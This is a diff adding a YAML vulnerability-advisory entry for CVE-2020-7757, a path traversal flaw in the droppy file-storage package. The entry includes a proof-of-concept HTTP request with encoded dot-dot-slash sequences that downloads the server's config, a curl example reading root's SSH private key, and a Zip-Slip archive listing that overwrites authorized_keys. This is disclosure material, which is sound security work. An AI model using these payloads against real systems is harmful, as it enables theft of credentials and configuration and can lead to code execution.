@@ -19,6 +19,64 @@
   created_date: 1970-01-01
   last_modified_date: 1970-01-01
   credit: Craig Arendt
+- id: snykio:npm:droppy:1023656
+  title: Path Traversal
+  description: "[droppy][1] is a library for self-hosted file storage.\n\nAffected
+    versions of this package are vulnerable to Path Traversal. It\nis possible to
+    traverse directories to fetch configuration files from a\n`droopy` server.\n\n###
+    PoC   {#poc}\n\n    GET /!/zip/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%73%72%76%2f%64%72%6f%70%70%79%2f%63%6f%6e%66%69%67
+    HTTP/1.1\n    Host: 192.168.0.11:8989\n    User-Agent: Mozilla/5.0 (X11; Ubuntu;
+    Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0\n    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n
+    \   Accept-Language: en-GB,en;q=0.5\n    Accept-Encoding: gzip, deflate\n    Connection:
+    close\n    Cookie: s=XtlnyU3If2YoVi8jiExHS++NwzrMpQMbmS0l/usCPJcH2J8S\n    Upgrade-Insecure-Requests:
+    1\n    \n    \n    \n    \n    HTTP/1.1 200 OK\n    Content-Type: text/plain\n
+    \   Content-Disposition: attachment; filename=\"config.zip\"\n    Cache-Control:
+    private, max-age=0\n    ETag: \"4a-akoxq55ZKs8DpqVaiOcP6h8oCoI\"\n    Date: Sun,
+    25 Oct 2020 18:27:10 GMT\n    Connection: close\n    Content-Length: 847\n    \n
+    \   \n    Backend Request: /!/zip/../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../srv/droppy/config\n\n\n\n[1]:
+    https://github.com/silverwind/droppy\n\\nA Directory Traversal attack (also known
+    as path traversal) aims to\naccess files and directories that are stored outside
+    the intended\nfolder. By manipulating files with \\\"dot-dot-slash (../)\\\" sequences
+    and\nits variations, or by using absolute file paths, it may be possible to\naccess
+    arbitrary files and directories stored on file system, including\napplication
+    source code, configuration, and other critical system files.\n\nDirectory Traversal
+    vulnerabilities can be generally divided into two\ntypes:\n\n* **Information Disclosure**\\:
+    Allows the attacker to gain information\n  about the folder structure or read
+    the contents of sensitive files on\n  the system.\n\n`st` is a module for serving
+    static files on web pages, and contains a\n[vulnerability of this type][1]. In
+    our example, we will serve files\nfrom the `public` route.\n\nIf an attacker requests
+    the following URL from our server, it will in\nturn leak the sensitive private
+    key of the root user.\n\n    curl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa\n\n**Note**
+    `%2e` is the URL encoded version of `.` (dot).\n\n* **Writing arbitrary files**\\:
+    Allows the attacker to create or replace\n  existing files. This type of vulnerability
+    is also known as\n  `Zip-Slip`.\n\nOne way to achieve this is by using a malicious
+    `zip` archive that holds\npath traversal filenames. When each filename in the
+    zip archive gets\nconcatenated to the target extraction folder, without validation,
+    the\nfinal path ends up outside of the target folder. If an executable or a\nconfiguration
+    file is overwritten with a file containing malicious code,\nthe problem can turn
+    into an arbitrary code execution issue quite\neasily.\n\nThe following is an example
+    of a `zip` archive with one benign file and\none malicious file. Extracting the
+    malicious file will result in\ntraversing out of the target folder, ending up
+    in `/root/.ssh/`\noverwriting the `authorized_keys` file:\n\n    2018-04-15 22:04:29
+    .....           19           19  good.txt\n    2018-04-15 22:04:42 .....           20
+    \          20  ../../../../../../root/.ssh/authorized_keys\n\n\n\n[1]: https://snyk.io/vuln/npm:st:20140206\n"
+  affected_package: droppy
+  vulnerable_versions:
+  - "*"
+  severity: medium
+  package_manager: npm
+  cve:
+  - CVE-2020-7757
+  cwe:
+  - CWE-22
+  disclosed_date: 2020-10-29
+  created_date: 2020-10-29
+  last_modified_date: 2020-10-29
+  credit:
+  - Snyk Security Team
+  references:
+  - https://github.com/silverwind/droppy/blob/master/server/server.js#L845
+  source_url: https://snyk.io/vuln/SNYK-JS-DROPPY-1023656
 - id: snykio:npm:droppy:20160328
   title: Cross-site Request Forgery (CSRF)
   description: |+
